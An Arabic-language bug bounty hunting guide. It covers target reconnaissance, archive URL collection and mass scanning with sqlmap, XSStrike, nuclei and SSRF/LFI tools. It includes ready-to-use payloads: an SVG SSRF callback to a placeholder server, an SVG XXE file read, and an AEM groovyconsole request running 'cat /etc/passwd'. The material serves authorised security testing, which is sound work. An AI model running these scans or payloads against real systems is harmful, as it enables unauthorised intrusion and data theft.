
# 🧭 الدليل الشامل لاصطياد الثغرات 
---

## 🥇 المرحلة 1: تحديد الهدف (Reconnaissance)

### 🎯 الهدف من المرحلة:

تعرف *مين الشركة* اللي هتشتغل عليها، و*إيه النطاقات (domains)* المسموح لك تفحصها.

---

### 📦 1.1 جلب أهداف البرامج العامة (Public Programs)

فيه مصدرين كبار بيدوك نطاقات البرامج اللي عندها مكافآت حقيقية:

#### 🧰 أداة Chaos

تجيب قائمة البرامج اللي فيها “bounty = true”.

```bash
curl -s https://raw.githubusercontent.com/projectdiscovery/public-bugbounty-programs/main/chaos-bugbounty-list.json | jq ".[][] | select(.bounty==true) | .domains[]" -r > targets.txt
```

> 🧠 ده بيجيب JSON من مشروع Chaos ويستخرج الدومينات اللي فيها مكافآت، ويحطها في ملف `targets.txt`.

---

#### 🧰 أداة Arkadiyt

ده مصدر تاني بيجمع بيانات bug bounty من HackerOne وBugcrowd و Intigriti.

```bash
curl -s "https://raw.githubusercontent.com/arkadiyt/bounty-targets-data/main/data/domains.txt" | anew targets.txt
curl -s "https://raw.githubusercontent.com/arkadiyt/bounty-targets-data/main/data/wildcards.txt" | anew target-wildcards.txt
```

> `anew` بتتأكد إن القيم الجديدة بس هي اللي بتضاف بدون تكرار.

---

### 🔐 1.2 لو عندك حساب رسمي على منصات الباونتي

تقدر تجيب نطاقاتك الخاصة باستخدام **bbscope**.

#### 🧩 تثبيت bbscope:

```bash
git clone https://github.com/sw33tLie/bbscope
cd bbscope
pip3 install -r requirements.txt
```

#### 🔹 HackerOne:

```bash
bbscope h1 -a -u <username> -t <token> -b > bbscope-h1.txt
```

#### 🔹 Bugcrowd:

```bash
bbscope bc -t <token> -b > bbscope-bc.txt
```

#### 🔹 Intigriti:

```bash
bbscope it -t <token> -b > bbscope-it.txt
```

---

### 💻 1.3 مفيش VPS؟ استخدم سيرفر مجاني

لو مش عندك فلوس تشتري VPS مدفوع، تقدر تستخدم:
🔗 [https://shell.segfault.net/](https://shell.segfault.net/)

---

## 🧾 المرحلة 2: جمع البيانات التاريخية (Wayback + Archive)

### 🎯 الهدف:

تجيب **روابط قديمة جدًا** كانت في الموقع، عشان ممكن تلاقي endpoints منسية أو حساسة.

---

### 🧰 أداة waymore

تجيب روابط من الـ Wayback Machine وURLScan وغيرها.

#### تثبيت الأداة:

```bash
git clone https://github.com/xnl-h4ck3r/waymore.git /opt/waymore || git -C /opt/waymore pull
pip3 install -r /opt/waymore/requirements.txt
ln -s /opt/waymore/waymore.py /usr/local/bin/waymore
chmod +x /usr/local/bin/waymore
```

> لو Python عامل مشكلة:

```bash
sudo ln -s /usr/bin/python3 /usr/bin/python
```

#### إضافة مفتاح URLScan (اختياري):

افتح ملف الإعداد:

```
/opt/waymore/config.yml
```

وحط مفتاحك من:
🔗 [https://urlscan.io/user/profile/](https://urlscan.io/user/profile/)

---

### 🧩 تشغيل الأداة:

#### لملف فيه دومينات:

```bash
cat url.txt | while read host; do waymore -i $host | anew /root/urls-his.txt; done
```

#### لدومين واحد:

```bash
waymore -i http://google.com | anew /root/google-his.txt
```

> الناتج = `urls-his.txt` ➜ فيه روابط تاريخية.

---

## 🧮 المرحلة 3: تصفية الروابط بالأنماط (gf)

### 🎯 الهدف:

تستخدم أداة **gf** لتصنيف الروابط حسب نوع الثغرة اللي ممكن تكون فيها.

#### الأوامر:

```bash
cat urls-his | gf sql | anew sql
cat urls-his | gf xss | anew xss
cat urls-his | gf ssrf | anew ssrf
cat urls-his | gf lfi | anew lfi
```

> كل أمر بيستخرج نوع مختلف من الثغرات المحتملة في ملفات منفصلة.

---

## 💉 المرحلة 4: اختبار SQL Injection

### 🧩 بالأداة Ghauri:

```bash
cat sql | while read host; do ghauri -u $host --batch --level=3 -b --current-user --current-db --hostname --dbs; done
```

### 🧩 بالأداة Sqlmap:

```bash
sqlmap -m sql --batch --random-agent --level 5 --risk 3
```

> `-m sql` معناها إن كل لينك في الملف `sql` هيتجرب عليه.

---

## ⚔️ المرحلة 5: اختبار XSS

### 🔑 5.1 باستخدام Knoxnl + Knoxss API:

```bash
knoxnl -i xss -s -X BOTH
```

> لازم يكون عندك مفتاح Knoxss API من [https://knoxss.me/](https://knoxss.me/)

---

### 🧩 5.2 بدون API استخدم XSStrike:

#### تثبيت:

```bash
git clone https://github.com/s0md3v/XSStrike.git /opt/xsstrike || git -C /opt/xsstrike pull
pip3 install -r /opt/xsstrike/requirements.txt
ln -s /opt/xsstrike/xsstrike.py /usr/local/bin/xsstrike
chmod +x /usr/local/bin/xsstrike
```

#### اختبار رابط واحد:

```bash
xsstrike -f url
```

#### اختبار مجموعة روابط:

```bash
xsstrike --seeds xss -t 10 --blind
```

> تقدر تضيف **Blind XSS payloads** داخل:

```
/opt/xsstrike/core/config.py
```

---

## 🌊 المرحلة 6: اختبار SSRF

### 🧰 أدوات:

#### Surf:

```bash
surf -l ssrf -t 10 -c 200
```

#### ssrf-finder:

```bash
cat ssrf | ssrf-finder
```

---

## 📁 المرحلة 7: اختبار LFI (Local File Inclusion)

### 🧩 عبر Httpx:

```bash
httpx -l lfi -paths /root/LFI-files -threads 100 -random-agent -mc 200 -mr "root:[x*]:0:0:"
```

### 🧩 عبر Nuclei:

```bash
nuclei -l urls-his -c 200 -tags lfi
```

---

## 🚀 المرحلة 8: استخدام Nuclei Templates المتقدمة

### 🔹 تشغيل Nuclei بتاجات محددة:

```bash
nuclei -c 500 -l urls.txt -t nuclei-templates/ -severity critical,high -tags cve,rce,log4j,grafana,tomcat,solar,apache,lfi,ssrf,sql,xxe,symfony,exposure,traversal,panel,default-login,confluence,vmware,vcenter -o url_results.txt
```

### 🔹 فحص الفازينج:

```bash
nuclei -l urls-his -c 200 -t fuzzing-templates -s critical,high
```

---

## 🧨 المرحلة 9: اكتشاف الملفات الحساسة

```bash
cat urls | gauplus -subs | grep -E ".xls|.xml|.xlsx|.json|.pdf|.sql|.doc|.docx|.pptx|.txt|.zip|.tar.gz|.tgz|.bak|.7z|.rar"
```

---

## 🔐 المرحلة 10: البحث عن أسرار في JavaScript

### بالأداة nuclei exposure templates:

```bash
cat urls | gauplus -subs | grep ".js" | httpx -content-type | grep 'application/javascript' | awk '{print $1}' | nuclei -t nuclei-templates/http/exposures/ -silent > secrets.txt
```

### استخراج endpoints من ملفات JS:

```bash
cat urls | gauplus -subs | grep ".js" | anew jsfiles.txt
cat jsfiles.txt | grep -oh "\"\/[a-zA-Z0-9_/?=&]*\"" | sed -e 's/^"//' -e 's/"$//' | sort -u
```

---

## 🧱 المرحلة 11: اختبار Upload Forms

### باستخدام Google Dorks:

```
"Index of" "upload_image.php"
"index of" "Production.json"
inurl:upload.php
intitle:"Control Panel" "Admin Login"
```

### استغلالات ممكنة:

* **Blind XSS في SVG**
* **SSRF في SVG**
* **XXE في SVG**

#### مثال SSRF في SVG:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="200" height="200">
  <image height="200" width="200" xlink:href="http://<YOUR_SERVER>/image.jpeg" />
</svg>
```

#### مثال XXE في SVG:

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg">
  <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

---

## 🏗️ المرحلة 12: اختبار Adobe Experience Manager (AEM)

### خطوات:

1. جمع كل subdomains.

2. تحديد المواقع اللي فيها AEM.

3. تشغيل قوالب nuclei بـ tag `aem`:

   ```bash
   nuclei -l urls -tags aem -c 500 -o aem-results.txt
   ```

4. استخدم أداة `aem_discoverer.py`:

   ```bash
   python3 aem_discoverer.py --file urls.txt --workers 150
   ```

5. اختبر الثغرات المعروفة:

   * CVE-2016–0957
   * SSRF via opensocial proxy
   * RCE via groovyconsole

#### أمثلة:

```bash
POST /bin/groovyconsole/post.servlet HTTP/1.1
script=def proc="cat /etc/passwd".execute(); println proc.text
```

---

## ⚒️ المرحلة 13: أدوات مساعدة ومراجع

* [Ghauri](https://github.com/r0oth3x49/ghauri)
* [Knoxnl](https://github.com/xnl-h4ck3r/knoxnl)
* [SSRF Finder](https://github.com/random-robbie/ssrf-finder)
* [Femida](https://github.com/emadshanab/femida)
* [Nuclei Templates](https://github.com/projectdiscovery/nuclei-templates)
* [Burp Extensions](https://github.com/PortSwigger/auto-repeater)
* [xsshunter](https://xsshunter.com/)
* [aem-hacker](https://github.com/0ang3el/aem-hacker)

---
